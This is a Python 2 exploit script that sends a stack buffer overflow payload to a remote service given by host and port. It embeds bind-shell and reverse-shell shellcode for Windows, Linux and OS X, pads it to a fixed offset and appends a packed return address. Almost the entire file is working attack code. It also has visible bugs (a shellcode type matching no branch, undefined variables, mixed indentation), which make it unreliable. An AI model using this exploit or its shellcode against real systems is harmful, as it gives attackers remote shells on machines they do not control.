#!/usr/bin/env python

import os
import sys
import struct
import resource
import time
from socket import *
import telnetlib

offset = 168
def showBanner():
    print "  ____                                    "
    print " / ___|  ___   ___ _ __  _ __ ___   __ _  "
    print " \___ \ / _ \ / __| '_ \| '__/ _ \ / _` | "
    print "  ___) | (_) | (__| |_) | | | (_) | (_| | "
    print " |____/ \___/ \___| .__/|_|  \___/ \__, | "
    print "                  |_|              |___/  "
    return

def showUsage():
    print "Usage: %s host port" % sys.argv[0]
    return

def generatePattern(size=1024, start=0):
    try:
        bytes = open("pattern.txt").read(size+start)
        return bytes[start:]
    except:
        return "A" * size

def generateNops(size):
    return "\x90" * size

def pad(buf, offset):
    if len(buf) > offset:
        raise ValueError ("pad(): offset must be greater than buffer")
    else:
        buf = buf + "A" * ((offset - len(buf)))
        return buf

def generatePayload(os, arch, shellcodeType, offset):
    if os == "windows":
        if arch == "x86":
            if shellcodeType == "shell_bind_tcp":
                shellcode =  ""
                shellcode += "\xda\xde\xbd\xcd\x2f\x7b\x1b\xd9\x74\x24\xf4\x5b\x31"
                shellcode += "\xc9\xb1\x53\x31\x6b\x17\x83\xeb\xfc\x03\xa6\x3c\x99"
                shellcode += "\xee\xc4\xab\xdf\x11\x34\x2c\x80\x98\xd1\x1d\x80\xff"
                shellcode += "\x92\x0e\x30\x8b\xf6\xa2\xbb\xd9\xe2\x31\xc9\xf5\x05"
                shellcode += "\xf1\x64\x20\x28\x02\xd4\x10\x2b\x80\x27\x45\x8b\xb9"
                shellcode += "\xe7\x98\xca\xfe\x1a\x50\x9e\x57\x50\xc7\x0e\xd3\x2c"
                shellcode += "\xd4\xa5\xaf\xa1\x5c\x5a\x67\xc3\x4d\xcd\xf3\x9a\x4d"
                shellcode += "\xec\xd0\x96\xc7\xf6\x35\x92\x9e\x8d\x8e\x68\x21\x47"
                shellcode += "\xdf\x91\x8e\xa6\xef\x63\xce\xef\xc8\x9b\xa5\x19\x2b"
                shellcode += "\x21\xbe\xde\x51\xfd\x4b\xc4\xf2\x76\xeb\x20\x02\x5a"
                shellcode += "\x6a\xa3\x08\x17\xf8\xeb\x0c\xa6\x2d\x80\x29\x23\xd0"
                shellcode += "\x46\xb8\x77\xf7\x42\xe0\x2c\x96\xd3\x4c\x82\xa7\x03"
                shellcode += "\x2f\x7b\x02\x48\xc2\x68\x3f\x13\x8b\x5d\x72\xab\x4b"
                shellcode += "\xca\x05\xd8\x79\x55\xbe\x76\x32\x1e\x18\x81\x35\x35"
                shellcode += "\xdc\x1d\xc8\xb6\x1d\x34\x0f\xe2\x4d\x2e\xa6\x8b\x05"
                shellcode += "\xae\x47\x5e\xb3\xa6\xee\x31\xa6\x4b\x50\xe2\x66\xe3"
                shellcode += "\x39\xe8\x68\xdc\x5a\x13\xa3\x75\xf2\xee\x4c\x68\x5f"
                shellcode += "\x66\xaa\xe0\x4f\x2e\x64\x9c\xad\x15\xbd\x3b\xcd\x7f"
                shellcode += "\x95\xab\x86\x69\x22\xd4\x16\xbc\x04\x42\x9d\xd3\x90"
                shellcode += "\x73\xa2\xf9\xb0\xe4\x35\x77\x51\x47\xa7\x88\x78\x3f"
                shellcode += "\x44\x1a\xe7\xbf\x03\x07\xb0\xe8\x44\xf9\xc9\x7c\x79"
                shellcode += "\xa0\x63\x62\x80\x34\x4b\x26\x5f\x85\x52\xa7\x12\xb1"
                shellcode += "\x70\xb7\xea\x3a\x3d\xe3\xa2\x6c\xeb\x5d\x05\xc7\x5d"
                shellcode += "\x37\xdf\xb4\x37\xdf\xa6\xf6\x87\x99\xa6\xd2\x71\x45"
                shellcode += "\x16\x8b\xc7\x7a\x97\x5b\xc0\x03\xc5\xfb\x2f\xde\x4d"
                shellcode += "\x0b\x7a\x42\xe7\x84\x23\x17\xb5\xc8\xd3\xc2\xfa\xf4"
                shellcode += "\x57\xe6\x82\x02\x47\x83\x87\x4f\xcf\x78\xfa\xc0\xba"
                shellcode += "\x7e\xa9\xe1\xee"
	    else:
	        raise ValueError ("generatePayload(): shellcodeType must be 'bind_tcp' (got " + shellcodeType + ")")
        elif arch == "x64":
            if shellcodeType == "shell_bind_tcp":
                shellcode =  ""
            	shellcode += "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05"
	    	shellcode += "\xef\xff\xff\xff\x48\xbb\x28\xde\x10\x24\x03\x62\x9a"
		shellcode += "\xb1\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
		shellcode += "\xd4\x96\x93\xc0\xf3\x8a\x5a\xb1\x28\xde\x51\x75\x42"
		shellcode += "\x32\xc8\xe0\x7e\x96\x21\xf6\x66\x2a\x11\xe3\x48\x96"
		shellcode += "\x9b\x76\x1b\x2a\x11\xe3\x08\x96\x9b\x56\x53\x2a\x95"
		shellcode += "\x06\x62\x94\x5d\x15\xca\x2a\xab\x71\x84\xe2\x71\x58"
		shellcode += "\x01\x4e\xba\xf0\xe9\x17\x1d\x65\x02\xa3\x78\x5c\x7a"
		shellcode += "\x9f\x41\x6c\x88\x30\xba\x3a\x6a\xe2\x58\x25\xd3\xe9"
		shellcode += "\x1a\x39\x28\xde\x10\x6c\x86\xa2\xee\xd6\x60\xdf\xc0"
		shellcode += "\x74\x88\x2a\x82\xf5\xa3\x9e\x30\x6d\x02\xb2\x79\xe7"
		shellcode += "\x60\x21\xd9\x65\x88\x56\x12\xf9\x29\x08\x5d\x15\xca"
		shellcode += "\x2a\xab\x71\x84\x9f\xd1\xed\x0e\x23\x9b\x70\x10\x3e"
		shellcode += "\x65\xd5\x4f\x61\xd6\x95\x20\x9b\x29\xf5\x76\xba\xc2"
		shellcode += "\xf5\xa3\x9e\x34\x6d\x02\xb2\xfc\xf0\xa3\xd2\x58\x60"
		shellcode += "\x88\x22\x86\xf8\x29\x0e\x51\xaf\x07\xea\xd2\xb0\xf8"
		shellcode += "\x9f\x48\x65\x5b\x3c\xc3\xeb\x69\x86\x51\x7d\x42\x38"
		shellcode += "\xd2\x32\xc4\xfe\x51\x76\xfc\x82\xc2\xf0\x71\x84\x58"
		shellcode += "\xaf\x11\x8b\xcd\x4e\xd7\x21\x4d\x6d\xbd\x15\xe9\x83"
		shellcode += "\x77\xed\x22\x24\x03\x23\xcc\xf8\xa1\x38\x58\xa5\xef"
		shellcode += "\xc2\x9b\xb1\x28\x97\x99\xc1\x4a\xde\x98\xb1\x39\x82"
		shellcode += "\x10\x24\x03\x62\xdb\xe5\x61\x57\xf4\x68\x8a\x93\xdb"
		shellcode += "\x0b\x64\xa9\x36\x23\xfc\xb7\xd6\x38\xc2\xb6\x11\x25"
		shellcode += "\x03\x62\xc3\xf0\x92\xf7\x90\x4f\x03\x9d\x4f\xe1\x78"
		shellcode += "\x93\x21\xed\x4e\x53\x5a\xf9\xd7\x1e\x58\xad\xc1\x2a"
		shellcode += "\x65\x71\x60\x57\xd1\x65\xb9\x88\x95\x6e\xc8\x21\xc5"
		shellcode += "\x6c\x8a\xa5\xf0\xa1\x69\x86\x5c\xad\xe1\x2a\x13\x48"
		shellcode += "\x69\x64\xd2\xff\x34\x05\x65\x64\x60\xef\xc2\x6c\x8a"
		shellcode += "\x9b\xdb\x0b\x9f\x37\x28\xdb\xfc\xb7\xd7\x80\xe8\x96"
		shellcode += "\x21\xf6\x4b\xeb\x63\xf0\x92\xaa\xfc\x1f\xe2\x9d\x4f"
		shellcode += "\xf9\xa1\x27\x58\xad\xc4\x23\x20\xc4\x46\x93\x71\xdb"
		shellcode += "\xd6\x2a\x1b\x75\x88\xdc\x10\x24\x4a\xda\xf9\xdc\x4c"
		shellcode += "\xde\x10\x24\x03\x62\xdb\xe1\x69\x8e\x58\xad\xe1\x35"
		shellcode += "\xcd\xe6\x65\xef\xd0\x4e\x0e\x3b\xdb\xe1\xca\x22\x76"
		shellcode += "\xe3\x47\x46\xce\xb0\x29\x96\x9d\x60\x27\x7a\x5c\xb1"
		shellcode += "\x40\x96\x99\xc2\x55\x32\xdb\xe1\x69\x8e\x51\x74\x4a"
		shellcode += "\x9d\x5a\xf0\x78\x97\xef\xec\x4e\xeb\x5b\xfd\xa1\x1f"
		shellcode += "\x51\x9e\x7a\xae\xa5\x37\xd7\x0b\x58\x15\xd1\x2a\x65"
		shellcode += "\x7b\xa3\xd0\x51\x9e\x0b\xe5\x87\xd1\xd7\x0b\xab\xd4"
		shellcode += "\xb6\xc0\xcc\xf0\x92\x78\x85\x99\x9e\x9d\x4f\xf9\xab"
		shellcode += "\x1a\x38\x18\x05\x1e\x90\x31\xd3\x3e\x65\x21\xb8\x25"
		shellcode += "\x89\xc3\x47\xb4\x10\x7d\x42\xeb\x40\x4e\xfd\xde\x10"
		shellcode += "\x24\x03\x62\x9a\xb1"
	    else:
	        raise ValueError ("generatePayload(): shellcodeType must be 'bind_tcp' (got " + shellcodeType + ")")
    elif os == "linux":
	if arch == "x86":
            if shellcodeType == "shell_bind_tcp":
                shellcode =  ""
		shellcode += "\xda\xd6\xbe\x2b\xd8\x92\x21\xd9\x74\x24\xf4\x5d\x33"
		shellcode += "\xc9\xb1\x14\x31\x75\x19\x03\x75\x19\x83\xc5\x04\xc9"
		shellcode += "\x2d\xa3\xfa\xfa\x2d\x97\xbf\x57\xd8\x1a\xc9\xb6\xac"
		shellcode += "\x7d\x04\xb8\x96\xdf\xc4\xd0\x2a\xe0\xf9\x7c\x41\xf0"
		shellcode += "\xa8\x2c\x1c\x11\x20\xaa\x46\x1f\x35\xbb\x36\x9b\x85"
		shellcode += "\xbf\x08\xc5\x24\x3f\x2b\xba\xd1\xf2\x2c\x29\x44\x66"
		shellcode += "\x12\x16\xba\xf6\x25\xdf\xbc\x9e\x9a\x30\x4e\x36\x8d"
		shellcode += "\x61\xd2\xaf\x23\xf7\xf1\x7f\xef\x8e\x17\xcf\x04\x5c"
		shellcode += "\x57"
            elif shellcodeType == "shell_reverse_tcp":
		shellcode =  ""
		shellcode += "\xda\xc5\xbb\x2d\x10\x31\x5f\xd9\x74\x24\xf4\x5f\x2b"
		shellcode += "\xc9\xb1\x12\x31\x5f\x17\x83\xc7\x04\x03\x72\x03\xd3"
		shellcode += "\xaa\xbd\xf8\xe4\xb6\xee\xbd\x59\x53\x12\xcb\xbf\x13"
		shellcode += "\x74\x06\xbf\xc7\x21\x28\xff\x2a\x51\x01\x79\x4c\x39"
		shellcode += "\x52\xd1\xae\x89\x3a\x20\xaf\xed\x68\xad\x4e\x5d\xea"
		shellcode += "\xfe\xc1\xce\x40\xfd\x68\x11\x6b\x82\x39\xb9\x1a\xac"
		shellcode += "\xce\x51\x8b\x9d\x1f\xc3\x22\x6b\xbc\x51\xe6\xe2\xa2"
		shellcode += "\xe5\x03\x38\xa4"
            else:
                raise ValueError ("generatePayload(): shellcodeType must be either 'shell_bind_tcp' or 'shell_reverse_tcp' (got " + shellcodeType + ")")
	elif arch == "x64":
            if shellcodeType == "shell_bind_tcp":
		shellcode =  ""
		shellcode += "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05"
		shellcode += "\xef\xff\xff\xff\x48\xbb\xbc\xf9\x7a\xd5\x43\xdd\xf9"
		shellcode += "\x6b\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
		shellcode += "\xd6\xd0\x22\x4c\x29\xdf\xa6\x01\xbd\xa7\x75\xd0\x0b"
		shellcode += "\x4a\xab\xac\xb8\xdd\x78\xd5\x52\x81\xb1\xe2\x5a\x93"
		shellcode += "\x6a\x8f\x29\xec\xa1\x64\xb9\x93\x48\x8d\x4c\xd8\xb1"
		shellcode += "\x5a\x4a\x93\x51\x8d\x4c\xd8\xb1\xfc\xd6\xfa\x24\x9d"
		shellcode += "\xbc\x13\x93\x4a\xe4\xf6\x7f\xa0\xb5\xb7\xc2\x33\x25"
		shellcode += "\xb1\xc1\xfa\x21\xb4\x97\x44\xcf\x91\x7a\x86\x0b\x54"
		shellcode += "\x1e\x39\xeb\xb1\xf3\x33\x4c\xd8\xf9\x6b"
	    else:
	        raise ValueError ("generatePayload(): shellcodeType must be 'bind_tcp' (got " + shellcodeType + ")")
    elif os == "osx":
        if arch == "x86":
	    if shellcodeType == "shell_bind_tcp":
	        shellcode =  ""
		shellcode+= "\xba\xa6\xfa\x44\x64\xdb\xca\xd9\x74\x24\xf4\x5f\x2b"
		shellcode += "\xc9\xb1\x13\x31\x57\x14\x03\x57\x14\x83\xef\xfc\x44"
		shellcode += "\x0f\x75\xa4\xd8\x98\x89\x26\xc9\x04\xff\xc0\xb9\xde"
		shellcode += "\xfe\x64\x3b\x75\x11\xc9\x5a\x44\x91\x7e\xcc\x06\xf8"
		shellcode += "\xe8\xb4\x6b\x7c\x61\x03\x98\xcd\x18\x46\xe0\x9e\xc3"
		shellcode += "\x95\x61\x8e\xab\x4f\x38\x77\x81\x0f\x43\xc8\xfd\x76"
		shellcode += "\x4a\x87\x95\xa7\x9d\x5b\x0e\xdf\xce\xf9\xa7\x71\x98"
		shellcode += "\x1d\x67\xd9\xce\xb2\xd8\x51\xd5\xf9\x59"
	    else:
	        raise ValueError ("generatePayload(): shellcodeType must be 'bind_tcp' (got " + shellcodeType + ")")
        elif arch == "x64":
	    if shellCodeType == "shell_bind_tcp":
		shellcode =  ""
		shellcode += "\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d\x05"
		shellcode += "\xef\xff\xff\xff\x48\xbb\x7d\x15\x56\xa3\x45\x5e\x5b"
		shellcode += "\xd1\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
		shellcode += "\xc5\x74\x56\xa3\x47\x34\x59\x8e\x17\x14\x08\xeb\x74"
		shellcode += "\x8c\x54\xd4\x35\x9c\x91\x1b\x2d\x5e\x5b\xd3\x35\x24"
		shellcode += "\xa0\xf5\xfb\x5e\x59\xc0\x21\x43\x1e\x2a\xa3\x34\x4b"
		shellcode += "\x8b\x72\x10\xee\xc9\x45\x5e\x59\x99\x4c\xe3\x1e\x5c"
		shellcode += "\x83\x17\xd2\x2d\x72\x10\xee\xbd\x45\x5e\x59\x9d\xf4"
		shellcode += "\xf2\x1e\x2a\xa3\x16\xd2\x33\x35\x96\xbc\xa7\x4a\x5b"
		shellcode += "\x13\x58\xba\xad\x0c\xa3\x45\x5c\x13\xe0\x8b\x1a\x53"
		shellcode += "\x1b\x1f\x5e\x5b\xd3\x35\xea\x90\xac\x40\x16\x6a\x11"
		shellcode += "\xc5\x2e\x56\xa3\x47\xb6\x53\xd1\x7d\x15\x79\xc1\x2c"
		shellcode += "\x30\x74\xa2\x15\x15\x1e\x28\x79\x7a\x13\xe0\xaf\x47"
		shellcode += "\x01\xeb\xcc\xb8\x54\xd4"
	    else:
	        raise ValueError ("generatePayload(): shellcodeType must be 'bind_tcp' (got " + shellcodeType + ")")
        else:
            raise ValueError ("generatePayload(): arch must be either x86 or x64 (got " + arch + ")")
    else:
        raise ValueError ("generatePayload(): os must be either windows, linux, or osx (got " + os + ")")
    payload = pad(shellcode, offset)
    return payload

def pack(number, endianness='little', signed=False):
    if signed != False and number < 0:
        signed = True
    if isinstance(number, (int, long)) != True:
        raise ValueError("pack(): number must be of type (int, long) (got " + type(number) + ")")
    if signed not in [True, False]:
        raise ValueError("pack(): signed must be either True or False (got " + signed + ")")
    if endianness not in ['little', 'big']:
        raise ValueError("pack(): endianness must be either 'little' or 'big' (got " + endianness + ")")
    if number == 0:
        buf_size = 8
    elif number > 0:
        if signed == False:
            buf_length = ((number.bit_length() -1) | 7) + 1
        else:
            buf_length = (number.bit_length() | 7) + 1
    else:
        if signed == False:
            raise ValueError("pack(): unsigned number cannot be negative")
        buf_length = ((number +1).bit_length() | 7) + 1

        if signed == True:
            limit = 1 << buf_length
            if number < 0 or number >= limit :
                raise ValueError("pack(): number does not fit in buffer")
    number = number & ((1 << buf_length) -1)
    byte_size = (buf_length + 7) / 8
    out = []
    for _ in range(byte_size):
        out.append(chr(number & 0xff))
        number = number >> 8
    if endianness == 'little':
        return ''.join(out)
    else:
        return ''.join(reversed(out))

def unpack(data, endianness='little', signed=False):
    buf_length = len(data) * 8
    byte_size = (buf_length + 7) / 8
    if byte_size !=len(data):
        raise ValueError("unpack(): data has incorrect length. Length " + byte_size + " expected, " + buf_length + " found")
    number = 0
    if endianness == 'little':
        data = reversed(data)
    data = bytearray(data)
    for c in data:
        number = (number << 8) + c
    number = number & ((1 << buf_length) - 1)
    if sign == False:
        return int(number)
    signbit = number & (1 << (word_size - 1))
    return int(number - 2 * signbit)    

class TCPClient():
    def __init__(self, rhost, rport):
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.connect((rhost, rport))

    def send(self, data, delay=0):
        if delay:
            time.sleep(delay)
        nsend = self.sock.send(data)
        return nsend

    def sendLine(self, data, delay=0):
        nsend = self.send(data + "\n", delay)
        return nsend

    def recv(self, size=1024, delay=0):
        if delay:
            time.sleep(delay)
        buf = self.sock.recv(size)
        return buf

    def recv_until(self, delim):
        buf = ""
        while True:
            c = self.sock.recv(1)
            buf += c
            if delim in buf:
                break
        return buf

    def recvline(self):
        buf = self.recv_until("\n")
        return buf

    def close(self):
        self.sock.close()

def exploit(rhost, rport):
    client = TCPClient(rhost, rport)
    client.sendLine("48093572")
    client.sendLine("3")
    buf = generatePayload("linux", "x86", "reverse_tcp", 168) + pack(0x8048563)
    client.send(buf)
    print(buf)
    return
    
if __name__ == "__main__":
    if len(sys.argv) < 3:
        showUsage()
    else:
        exploit(sys.argv[1], int(sys.argv[2]))

